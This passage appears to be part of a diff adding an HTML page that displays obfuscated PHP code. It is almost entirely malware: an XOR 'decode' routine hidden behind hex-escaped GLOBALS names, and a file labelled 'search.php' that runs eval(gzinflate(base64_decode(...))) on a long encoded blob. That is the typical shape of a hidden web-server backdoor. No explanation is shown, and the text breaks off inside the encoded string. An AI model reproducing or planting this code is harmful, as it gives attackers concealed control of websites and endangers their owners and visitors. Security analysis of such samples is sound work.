class="mi">8</span><span class="p">)</span><span class="o">&amp;</span><span class="mi">255</span><span class="p">)</span><span class="mf">.</span><span class="nb">chr</span><span class="p">(</span><span class="nv">${$fyojtix}</span><span class="o">&amp;</span><span class="mi">255</span><span class="p">);}</span><span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f</span><span class="s2">BAL</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73\x77</span><span class="s2">z</span><span class="se">\x6a\x64</span><span class="s2">m</span><span class="se">\x6d</span><span class="s2">ek"</span><span class="p">]},</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6a\x69\x68\x6b\x75\x6d</span><span class="s2">y</span><span class="se">\x72\x6e\x71\x63</span><span class="s2">"</span><span class="p">]})</span><span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">LOB</span><span class="se">\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x63\x74\x78\x67</span><span class="s2">vq</span><span class="se">\x67</span><span class="s2">l</span><span class="se">\x76\x6f</span><span class="s2">g"</span><span class="p">]}));}</span><span class="k">function</span> <span class="n">decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$key</span><span class="p">){</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42</span><span class="s2">ALS"</span><span class="p">}[</span><span class="s2">"n</span><span class="se">\x7a\x78</span><span class="s2">z</span><span class="se">\x78\x68</span><span class="s2">d</span><span class="se">\x75</span><span class="s2">i</span><span class="se">\x77\x66</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x69</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"GLO</span><span class="se">\x42\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x78</span><span class="s2">i</span><span class="se">\x71\x77\x62\x64</span><span class="s2">k</span><span class="se">\x77</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6b</span><span class="s2">e</span><span class="se">\x79\x33</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OB</span><span class="se">\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"h</span><span class="se">\x78\x6e\x74\x73\x6d</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x64\x61\x74</span><span class="s2">a"</span><span class="p">;</span><span class="nv">$nfcrlzoqiyym</span><span class="o">=</span><span class="s2">"</span><span class="se">\x69</span><span class="s2">"</span><span class="p">;</span><span class="nv">$ofbkzgrupiv</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6f</span><span class="s2">u</span><span class="se">\x74\x5f</span><span class="s2">da</span><span class="se">\x74</span><span class="s2">a"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"GLOB</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"ei</span><span class="se">\x61</span><span class="s2">l</span><span class="se">\x75\x74\x75</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x69</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f</span><span class="s2">B</span><span class="se">\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"r</span><span class="se">\x65</span><span class="s2">d</span><span class="se">\x73\x6f</span><span class="s2">b</span><span class="se">\x64</span><span class="s2">g</span><span class="se">\x66</span><span class="s2">w"</span><span class="p">]}</span><span class="o">=</span><span class="s2">"0</span><span class="se">\x38</span><span class="s2">ae</span><span class="se">\x38</span><span class="s2">1a2-</span><span class="se">\x65</span><span class="s2">45</span><span class="se">\x31</span><span class="s2">-4</span><span class="se">\x63\x39\x38</span><span class="s2">-88c</span><span class="se">\x65</span><span class="s2">-9d2</span><span class="se">\x32</span><span class="s2">562</span><span class="se">\x66\x30\x61\x63</span><span class="s2">0"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f</span><span class="s2">B</span><span class="se">\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"nm</span><span class="se">\x74</span><span class="s2">ku</span><span class="se">\x6b\x64\x65</span><span class="s2">"</span><span class="p">]</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6f\x75</span><span class="s2">t</span><span class="se">\x5f</span><span class="s2">da</span><span class="se">\x74\x61</span><span class="s2">"</span><span class="p">;</span><span class="nv">$eykvvkxfgb</span><span class="o">=</span><span class="s2">"</span><span class="se">\x69</span><span class="s2">"</span><span class="p">;</span><span class="nv">$hlrlfgf</span><span class="o">=</span><span class="s2">"</span><span class="se">\x6b</span><span class="s2">e</span><span class="se">\x79</span><span class="s2">"</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f</span><span class="s2">BA</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x77\x64\x6b\x71\x65\x67\x62</span><span class="s2">t</span><span class="se">\x73</span><span class="s2">"</span><span class="p">]}</span><span class="o">=</span><span class="nb">pack</span><span class="p">(</span><span class="s2">"</span><span class="se">\x48</span><span class="s2">*"</span><span class="p">,</span><span class="s2">"0</span><span class="se">\x34\x35</span><span class="s2">d07</span><span class="se">\x35\x33\x30\x62\x35</span><span class="s2">0</span><span class="se">\x30</span><span class="s2">35</span><span class="se">\x37</span><span class="s2">00</span><span class="se">\x35</span><span class="s2">4</span><span class="se">\x35\x35\x35\x37\x35\x35\x30\x30</span><span class="s2">0</span><span class="se">\x30</span><span class="s2">5</span><span class="se">\x36\x35\x38</span><span class="s2">0e</span><span class="se">\x30\x30\x30\x31\x30</span><span class="s2">9500</span><span class="se">\x31\x30</span><span class="s2">00</span><span class="se">\x66\x30\x32\x35</span><span class="s2">0</span><span class="se">\x30</span><span class="s2">b</span><span class="se">\x30\x63</span><span class="s2">0</span><span class="se">\x30\x30\x37</span><span class="s2">51</span><span class="se">\x35</span><span class="s2">55</span><span class="se">\x33\x35</span><span class="s2">7</span><span class="se">\x35\x32</span><span class="s2">"</span><span class="p">);</span><span class="nv">${$ofbkzgrupiv}</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f</span><span class="s2">BA</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"o</span><span class="se">\x67</span><span class="s2">y</span><span class="se">\x63\x73\x66\x71\x70</span><span class="s2">q"</span><span class="p">]</span><span class="o">=</span><span class="s2">"key</span><span class="se">\x33</span><span class="s2">"</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">${$nfcrlzoqiyym}</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f</span><span class="s2">BA</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"n</span><span class="se">\x7a</span><span class="s2">x</span><span class="se">\x7a</span><span class="s2">x</span><span class="se">\x68\x64</span><span class="s2">u</span><span class="se">\x69\x77\x66</span><span class="s2">"</span><span class="p">]}</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6e\x76\x69\x71\x70</span><span class="s2">hl"</span><span class="p">]});</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OB</span><span class="se">\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6f\x69\x6d\x66\x77\x70\x62\x76\x73</span><span class="s2">"</span><span class="p">]}</span><span class="o">++</span><span class="p">)</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"G</span><span class="se">\x4c\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x73</span><span class="s2">p</span><span class="se">\x72</span><span class="s2">b</span><span class="se">\x77\x6c\x6f\x69</span><span class="s2">"</span><span class="p">]}</span><span class="mf">.</span><span class="o">=</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x68</span><span class="s2">x</span><span class="se">\x6e</span><span class="s2">t</span><span class="se">\x73\x6d</span><span class="s2">"</span><span class="p">]}[</span><span class="nv">${$eykvvkxfgb}</span><span class="p">]</span><span class="o">^</span><span class="nv">${$hlrlfgf}</span><span class="p">[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47</span><span class="s2">L</span><span class="se">\x4f\x42\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6f</span><span class="s2">i</span><span class="se">\x6d</span><span class="s2">f</span><span class="se">\x77\x70\x62</span><span class="s2">v</span><span class="se">\x73</span><span class="s2">"</span><span class="p">]}</span><span class="o">%</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x71\x6c\x79\x6d\x6f\x6b\x66\x7a</span><span class="s2">o</span><span class="se">\x65</span><span class="s2">"</span><span class="p">]})]</span><span class="o">^</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">OB</span><span class="se">\x41</span><span class="s2">L</span><span class="se">\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x72\x65</span><span class="s2">d</span><span class="se">\x73</span><span class="s2">o</span><span class="se">\x62\x64\x67\x66\x77</span><span class="s2">"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GLOB</span><span class="se">\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"ei</span><span class="se">\x61</span><span class="s2">l</span><span class="se">\x75\x74</span><span class="s2">u"</span><span class="p">]}</span><span class="o">%</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42\x41</span><span class="s2">LS"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x72\x65\x64</span><span class="s2">s</span><span class="se">\x6f\x62\x64\x67\x66</span><span class="s2">w"</span><span class="p">]})]</span><span class="o">^</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"GL</span><span class="se">\x4f\x42\x41\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x6f\x67\x79\x63\x73</span><span class="s2">f</span><span class="se">\x71\x70</span><span class="s2">q"</span><span class="p">]}[</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c</span><span class="s2">O</span><span class="se">\x42</span><span class="s2">A</span><span class="se">\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"oi</span><span class="se">\x6d</span><span class="s2">f</span><span class="se">\x77\x70\x62\x76\x73</span><span class="s2">"</span><span class="p">]}</span><span class="o">%</span><span class="nb">strlen</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f</span><span class="s2">B</span><span class="se">\x41\x4c</span><span class="s2">S"</span><span class="p">}[</span><span class="s2">"</span><span class="se">\x78</span><span class="s2">i</span><span class="se">\x71\x77\x62\x64\x6b</span><span class="s2">w"</span><span class="p">]})];</span><span class="k">return</span><span class="err">$</span><span class="p">{</span><span class="err">$</span><span class="p">{</span><span class="s2">"</span><span class="se">\x47\x4c\x4f\x42</span><span class="s2">A</span><span class="se">\x4c\x53</span><span class="s2">"</span><span class="p">}[</span><span class="s2">"n</span><span class="se">\x6d\x74</span><span class="s2">k</span><span class="se">\x75\x6b\x64\x65</span><span class="s2">"</span><span class="p">]};}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p><strong>search.php</strong></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nb">gzinflate</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'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
